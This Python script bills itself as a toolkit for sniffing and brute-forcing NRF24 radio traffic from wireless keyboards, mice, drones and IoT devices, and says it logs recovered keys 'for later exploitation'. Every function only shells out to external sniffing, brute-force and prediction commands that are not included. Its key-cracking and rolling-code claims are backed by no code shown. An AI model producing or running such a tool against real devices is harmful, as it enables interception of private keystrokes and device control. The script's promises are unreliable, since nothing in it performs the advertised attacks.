import argparse
import os
import time
import json

# -------------------------------------------
# NRF52840 NRF24 Brute-Force & Sniffing Toolkit
# -------------------------------------------
# Features:
# - Sniffs NRF24 packets from wireless keyboards, mice, drones, and IoT devices
# - Brute-forces NRF24 encryption keys to decrypt captured traffic
# - Attempts rolling-code prediction for vulnerable NRF24-based devices
# - Logs successful key recoveries for later exploitation
#
# Requirements:
# - NRF52840 Dongle / Dev Board (Adafruit Feather, Nordic Dongle, XIAO NRF52840)
# - Firmware: nrf24_sniffer (NRF24 packet analysis)
# - Python 3.x
#
# Usage:
# 1. Scan for active NRF24 devices:
#    python nrf52840_nrf24_bruteforce.py --scan
# 2. Sniff and capture NRF24 packets:
#    python nrf52840_nrf24_bruteforce.py --sniff
# 3. Brute-force NRF24 encryption keys:
#    python nrf52840_nrf24_bruteforce.py --bruteforce
# 4. Attempt rolling-code prediction:
#    python nrf52840_nrf24_bruteforce.py --predict
# -------------------------------------------

def scan_nrf24():
    """Scans for active NRF24 devices."""
    print("[+] Scanning for active NRF24 devices...")
    os.system("nrf24_sniffer --scan > nrf24_devices.txt")
    print("[✔] Scan results saved to nrf24_devices.txt")

def sniff_nrf24():
    """Sniffs NRF24 packets for later analysis."""
    print("[+] Sniffing NRF24 packets...")
    os.system("nrf24_sniffer --capture > nrf24_packets.txt")
    print("[✔] Captured packets saved to nrf24_packets.txt")

def bruteforce_nrf24():
    """Attempts to brute-force NRF24 encryption keys."""
    print("[+] Brute-forcing NRF24 encryption keys...")
    os.system("nrf24_bruteforce --input nrf24_packets.txt --output nrf24_keys.txt")
    print("[✔] Brute-force results saved to nrf24_keys.txt")

def predict_nrf24():
    """Attempts to predict rolling codes for NRF24-based devices."""
    print("[+] Predicting rolling codes for NRF24 transmissions...")
    os.system("nrf24_predict --input nrf24_packets.txt --output nrf24_predictions.txt")
    print("[✔] Rolling-code predictions saved to nrf24_predictions.txt")

def main():
    parser = argparse.ArgumentParser(description="NRF52840 NRF24 Brute-Force & Sniffing Toolkit")
    parser.add_argument("--scan", action='store_true', help="Scan for active NRF24 devices")
    parser.add_argument("--sniff", action='store_true', help="Sniff and capture NRF24 packets")
    parser.add_argument("--bruteforce", action='store_true', help="Brute-force NRF24 encryption keys")
    parser.add_argument("--predict", action='store_true', help="Attempt rolling-code prediction")
    args = parser.parse_args()

    if args.scan:
        scan_nrf24()
    elif args.sniff:
        sniff_nrf24()
    elif args.bruteforce:
        bruteforce_nrf24()
    elif args.predict:
        predict_nrf24()
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
